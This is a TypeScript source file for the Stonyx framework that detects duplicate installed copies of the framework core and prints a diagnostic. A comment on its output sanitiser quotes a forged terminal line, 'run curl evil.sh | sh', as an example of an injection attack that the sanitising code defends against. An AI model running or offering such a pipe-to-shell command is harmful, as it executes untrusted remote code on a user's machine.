/**
 * Invariant I1 of the Sprint 93 install-and-boot cluster — "one core".
 *
 * At `Stonyx.start()`, every discovered module must resolve the SAME physical
 * `stonyx` package root as the running core. Otherwise the app has two
 * framework singletons: `loadModules` runs on copy A, and a module whose own
 * subtree carries copy B registers its config, its Chronicle types and its
 * lifecycle hooks on B — which nobody ever `start()`ed.
 *
 * Why a PRE-FLIGHT and not a better `catch`. The catch only sees modules that
 * happen to touch `Stonyx.config` at load time and therefore throw
 * "Stonyx has not been initialized yet". A module that does not touch it at
 * load time does not throw at all: it loads, it initialises, it reports
 * success, and its hooks silently never fire. That failure is invisible today,
 * and no improvement to the catch can reach it. Multiple cores is never a
 * valid state, so it is detected up front and refused.
 *
 * Measured shape this exists for (abofs/stonyx#108, `stonyx new` scaffold at
 * 0.2.3-beta.96): three distinct copies of the core on disk — `0.2.2`,
 * `0.2.3-beta.6`, `0.2.3-beta.11` — because five sibling repos pin the core
 * EXACTLY in their own `dependencies`, and an exact pin cannot dedupe against
 * a sibling's different exact pin.
 */
import { createRequire } from 'node:module';
import { readFileSync, realpathSync } from 'node:fs';
import { basename, dirname, join, sep } from 'node:path';
import { fileURLToPath } from 'node:url';

/** A resolved `stonyx` package: where it physically is, and what version. */
export interface CorePackage {
  /** Absolute, symlink-resolved package root (the directory holding package.json). */
  root: string;
  version: string;
}

export interface ForeignCore {
  moduleName: string;
  moduleCore: CorePackage;
  runningCore: CorePackage;
}

/** Symlinks resolved so `/tmp/...` and `/private/tmp/...` — and pnpm's
 * `node_modules/x -> .pnpm/x@v/node_modules/x` — compare equal. */
function realPath(path: string): string {
  try {
    return realpathSync(path);
  } catch {
    return path;
  }
}

/**
 * Told when the probe could not reach a conclusion.
 *
 * FAIL-OPEN IS THE POLICY; SILENCE IS NOT. `findForeignCores` must never invent
 * a boot failure out of an inconclusive probe — but "we could not check" has to
 * be distinguishable from "we checked and it is fine", because the states that
 * fail open are exactly the states in which a genuine second core is present
 * and unreported. Measured on trees that DO carry a second core, each of these
 * boots clean and silent while the control throws in the same run:
 *
 *   - an interposed `dist/package.json`, so the running core cannot name itself
 *   - a nested `stonyx/package.json` that is not valid JSON
 *   - the same file at `chmod 000`
 *
 * A reporter can only write a line. It cannot change the outcome.
 */
export type InconclusiveReporter = (message: string) => void;

const IGNORE: InconclusiveReporter = () => {};

/**
 * True exactly for the directories Node's own bare-specifier walk emits.
 *
 * `require.resolve.paths(x)` returns the walk FOLLOWED BY the CJS global
 * folders — `NODE_PATH`, `~/.node_modules`, `~/.node_libraries`, the node
 * prefix. ESM ignores every one of those, so honouring them invents a
 * "duplicate" out of an ambient environment variable that the real import never
 * consults. This workspace exports `NODE_PATH` at a different `stonyx`
 * (abofs/stonyx#107), so that false positive is not hypothetical: it flips a
 * tree that boots into a hard refusal.
 *
 * The predicate is the walk's own shape, and it is EXACT rather than
 * approximate. Node emits `<d>/node_modules` for every ancestor-or-self `d` of
 * the starting directory, and never descends into a directory already named
 * `node_modules`. So a candidate qualifies iff it is named `node_modules`, its
 * parent is not, and its parent is an ancestor-or-self of the module dir. Any
 * global-folder entry meeting all three is by construction already in the walk,
 * so admitting it changes nothing; every other one is dropped.
 *
 * The PREVIOUS form tested only `dirname(candidate)` against the module dir.
 * For a real walk entry that is the package root and the test holds by
 * construction — but for a `NODE_PATH` entry the candidate is a raw directory,
 * so `dirname` is its PARENT, and any module dir under that parent passed. It
 * went green on macOS only because `os.tmpdir()` yields `/var/folders/...`
 * while the resolved module dir is `/private/var/folders/...`, so the prefix
 * comparison missed on `/private` rather than on non-ancestry. It reds on
 * Linux, and it reds on macOS the moment `TMPDIR` is realpath-clean.
 *
 * `Module.globalPaths` would express the same restriction by PROVENANCE rather
 * than by shape, and it was measured working at runtime — but `@types/node@25`
 * does not declare it, so it needs an untyped cast whose `?? []` fallback
 * silently restores the defect if the undeclared property ever moves. This form
 * typechecks natively and admits the identical set.
 *
 * `moduleDir` must already be realpath'd; `coreSeenBy` does that first.
 */
export function isWalkEntry(candidate: string, moduleDir: string): boolean {
  if (basename(candidate) !== 'node_modules') return false;

  const owner = dirname(candidate);

  if (basename(owner) === 'node_modules') return false;

  return moduleDir === owner || moduleDir.startsWith(owner.endsWith(sep) ? owner : owner + sep);
}

/**
 * `null` when nothing is there — the ordinary case while walking up.
 *
 * A manifest that EXISTS but will not read or parse is a different state, and
 * it is the fail-open site that had neither a signal nor a test. ENOENT and
 * ENOTDIR mean "no package here"; anything else — EACCES from a `chmod 000`, or
 * a SyntaxError from a corrupt manifest, which carries no `code` at all — means
 * a package root was found and could not be inspected.
 */
function readPackageJson(dir: string, report: InconclusiveReporter = IGNORE): Record<string, unknown> | null {
  const file = join(dir, 'package.json');

  try {
    return JSON.parse(readFileSync(file, 'utf8')) as Record<string, unknown>;
  } catch (error) {
    const code = (error as NodeJS.ErrnoException | null)?.code;

    if (code !== 'ENOENT' && code !== 'ENOTDIR') {
      report(
        `Stonyx: ${file} exists but could not be read as JSON (${code ?? (error as Error)?.name ?? 'unknown error'}), ` +
        'so it was not checked for a duplicate framework core.'
      );
    }

    return null;
  }
}

function asCore(dir: string, report: InconclusiveReporter = IGNORE): CorePackage | null {
  const pkg = readPackageJson(dir, report);

  if (!pkg || pkg.name !== 'stonyx') return null;

  // A manifest with no string `version` is malformed, not absent. `'unknown'`
  // keeps the row in the table: dropping the whole core because one field is
  // missing would silently un-detect a real duplicate, which is the failure
  // mode this file exists to remove.
  return { root: realPath(dir), version: typeof pkg.version === 'string' ? pkg.version : 'unknown' };
}

/**
 * The nearest ancestor of `startDir` that OWNS a `package.json`, reported only
 * if that package is `stonyx`.
 *
 * Stops at the first `package.json` rather than at the first one NAMED stonyx:
 * the first is by definition the package that owns the file, and continuing
 * past it would walk out of the resolved package and could report an unrelated
 * ancestor — inside this repo's own worktree, that ancestor is the repo root,
 * which IS named `stonyx`. That would make every fixture look like a match.
 */
function owningCore(startDir: string, report: InconclusiveReporter = IGNORE): CorePackage | null {
  let dir = realPath(startDir);

  for (;;) {
    const pkg = readPackageJson(dir, report);

    if (pkg) return pkg.name === 'stonyx' ? asCore(dir, report) : null;

    const parent = dirname(dir);

    if (parent === dir) return null;

    dir = parent;
  }
}

/** The `stonyx` copy that is executing this code. */
export function runningCore(report: InconclusiveReporter = IGNORE): CorePackage | null {
  return owningCore(dirname(fileURLToPath(import.meta.url)), report);
}

/**
 * The `stonyx` copy a package installed at `moduleDir` would import.
 *
 * `require.resolve.paths('stonyx')` gives Node's own `node_modules` walk for a
 * bare specifier, which ESM and CJS share — and unlike `require.resolve` it
 * does not consult the target's `exports` map, so a module whose nested core
 * is present but unbuilt is still detected rather than silently skipped.
 *
 * TWO deliberate narrowings:
 *
 *  - `moduleDir` is realpath'd FIRST. Under pnpm, `<app>/node_modules/@stonyx/orm`
 *    is a symlink into `.pnpm/@stonyx+orm@v/node_modules/@stonyx/orm`, and Node
 *    resolves that symlink before resolving the module's own imports. Walking
 *    the symlink path instead reads the app's flat `node_modules` and reports
 *    the running core for every module — the check would pass vacuously on
 *    exactly the installer `stonyx new` uses.
 *  - Candidates are restricted to the entries Node's own walk emits, by
 *    `isWalkEntry`. `require.resolve.paths` appends the CJS global folders
 *    after the walk and ESM ignores every one of them; see that function for
 *    why the predicate is what it is and what the previous one got wrong.
 *
 * Returns `null` when no copy is reachable at all — "cannot tell", handled as
 * not-a-duplicate by `findForeignCores`. Manifests that exist but will not read
 * go to `report`; see `InconclusiveReporter`.
 */
export function coreSeenBy(moduleDir: string, report: InconclusiveReporter = IGNORE): CorePackage | null {
  const resolvedModuleDir = realPath(moduleDir);
  const candidates = createRequire(join(resolvedModuleDir, 'package.json')).resolve.paths('stonyx') ?? [];

  for (const nodeModulesDir of candidates) {
    if (!isWalkEntry(nodeModulesDir, resolvedModuleDir)) continue;

    const core = asCore(join(nodeModulesDir, 'stonyx'), report);

    if (core) return core;
  }

  return null;
}

/**
 * Every discovered module that would import a DIFFERENT physical core.
 *
 * FAIL DIRECTION — this is the property, not an implementation detail. A
 * module whose core cannot be resolved, and the case where the running core
 * cannot identify itself, both report NOTHING. This guard exists to convert a
 * silent wrong state into a loud one; it must not invent a boot failure out of
 * an inconclusive probe. Every state it does report has two package roots in
 * hand and has compared them.
 */
export function findForeignCores(
  modules: { name: string; dir: string }[],
  core: CorePackage | null | undefined = undefined,
  report: InconclusiveReporter = IGNORE
): ForeignCore[] {
  const resolved = core === undefined ? runningCore(report) : core;

  // The first fail-open, and the one with the widest blast radius: no core, no
  // comparison, nothing checked at all. Reported here rather than inside
  // `runningCore` so the same line is emitted however the caller arrived at it.
  if (!resolved) {
    report('Stonyx: the running framework core could not identify itself, so the duplicate-core pre-flight was skipped and a second core would not be reported.');

    return [];
  }

  const foreign: ForeignCore[] = [];

  for (const { name, dir } of modules) {
    const moduleCore = coreSeenBy(dir, report);

    // A module that resolves NO core is not an inconclusive probe and is not
    // reported: `coreSeenBy` walks exactly what the module would import, so
    // "nothing found" means there is no second copy on that path to hide. The
    // two states that CAN hide one report from where they occur.
    if (!moduleCore || moduleCore.root === resolved.root) continue;

    foreign.push({ moduleName: name, moduleCore, runningCore: resolved });
  }

  return foreign;
}

/**
 * Third-party manifest data is not trusted for display.
 *
 * `version` and the directory name both come off disk from a package this app
 * did not write, and both are echoed into a message a human reads in a
 * terminal. Seeded with ANSI escapes and embedded newlines, the raw value
 * FORGED ITS OWN LINES inside the diagnostic — `===> ALERT: run curl evil.sh |
 * sh <===`, indented to match — and destroyed the `padEnd` column alignment.
 * This renders BEFORE any module entry point is imported, so it is reachable
 * under `npm install --ignore-scripts`: the one mode in which no third-party
 * code has otherwise executed.
 *
 * Printable ASCII only, and bounded, so a long value cannot push the rest of
 * the message off screen either.
 */
function display(value: string, limit = 64): string {
  const clamped = value.replace(/[^\x20-\x7e]/g, '?');

  return clamped.length > limit ? `${clamped.slice(0, limit)}...` : clamped;
}

/**
 * The diagnostic. It replaces the message abofs/stonyx#108 was filed over —
 * `Stonyx modules with async loading must have a config/environment.js file` —
 * which named a file that was present and correct, and named a module that was
 * not the one that failed.
 *
 * Per `quality.md`, the replacement states what it does NOT cover, because the
 * message it replaces is exactly the kind of overstated claim that made the
 * next reader stop checking.
 */
export function duplicateCoreMessage(foreign: ForeignCore[]): string {
  const [ first ] = foreign;

  if (!first) throw new Error('duplicateCoreMessage called with no foreign cores');

  const names = foreign.map(({ moduleName }) => `"${moduleName}"`).join(', ');
  const single = foreign.length === 1;

  // DISTINCT roots, not `foreign.length + 1`. Two modules that both resolve
  // the SAME nested copy are two rows and two copies, not three. Found by
  // running this against a real `stonyx new` tree: there the naive count was
  // right by coincidence (three modules, three different copies), and it is
  // wrong for the commonest npm shape, where siblings on one exact pin dedupe
  // with each other.
  const copies = new Set([ first.runningCore.root, ...foreign.map(({ moduleCore }) => moduleCore.root) ]).size;

  const rows: [ string, string, string ][] = [
    [ 'running core', display(first.runningCore.version), display(first.runningCore.root, 200) ],
    ...foreign.map(({ moduleName, moduleCore }) =>
      [ `seen by "${moduleName}"`, display(moduleCore.version), display(moduleCore.root, 200) ] as [ string, string, string ]),
  ];
  const labelWidth = Math.max(...rows.map(([ label ]) => label.length));
  const versionWidth = Math.max(...rows.map(([ , version ]) => version.length));

  const versions = [ ...new Set(foreign.map(({ moduleCore }) => moduleCore.version)) ];

  // Only offer a pin when there IS one. Three modules pinning three different
  // versions cannot be reconciled by any consumer-side pin, and naming one of
  // them anyway is advice that does not work. The message this one replaces
  // was wrong for exactly that reason — it asserted more than it knew.
  //
  // AND only when that pin is not ALREADY IN EFFECT. Same version at two roots
  // is a duplicate INSTALL, not a version conflict — the shape
  // `npm install -g stonyx` plus `stonyx new` produces, and the one the docs
  // walk a consumer through — so telling them to pin the version their running
  // core already IS, is advice that has demonstrably just failed. That is the
  // same "asserts more than it knows" defect the whole message replaces.
  const consumerRemedy = versions.length !== 1
    ? 'There is no consumer-side pin that fixes this: the modules disagree among themselves ' +
      `(${versions.map(version => display(version)).join(', ')}). They must be republished with the peer shape above.`
    : versions[0] === first.runningCore.version
      ? `Fix (this app, meanwhile): every copy on disk is already stonyx@${display(versions[0])}, so this is a duplicate ` +
        'INSTALL and not a version conflict — no pin can merge them. Run one core: invoke the CLI from this app\'s own ' +
        'node_modules/.bin/stonyx rather than a global install, and remove the redundant copy listed above.'
      : `Fix (this app, meanwhile): pin stonyx@${display(versions[0])} so every copy dedupes to one.`;

  return [
    `Stonyx: ${copies} copies of the framework are installed and this app cannot be served.`,
    '',
    ...rows.map(([ label, version, root ]) => `  ${label.padEnd(labelWidth)}  ${version.padEnd(versionWidth)}  ${root}`),
    '',
    `Config, logging and lifecycle hooks are registered on the running core. ${names} ` +
    `${single ? 'imports' : 'import'} a different copy, so for ${single ? 'it' : 'them'} \`Stonyx.config\` is empty, ` +
    `\`Stonyx.log\` throws "Stonyx has not been initialized yet", and ${single ? 'its' : 'their'} ` +
    'startup and shutdown hooks never fire.',
    '',
    `Fix (module author): ${names} must declare stonyx in devDependencies plus a non-optional ` +
    'peerDependencies range, never as an exact dependency — @stonyx/discord is the reference shape. ' +
    consumerRemedy,
    '',
    'Scope of this check: it compares physical package ROOTS only. It does not check that the ' +
    'single surviving copy is a compatible version, and it looks at @stonyx/* packages declared in ' +
    'this app\'s devDependencies that carry the "stonyx-module" keyword — nothing else. A copy ' +
    'dragged in by anything outside that set, including an @stonyx/* package declared in ' +
    'dependencies rather than devDependencies, is not counted.',
  ].join('\n');
}
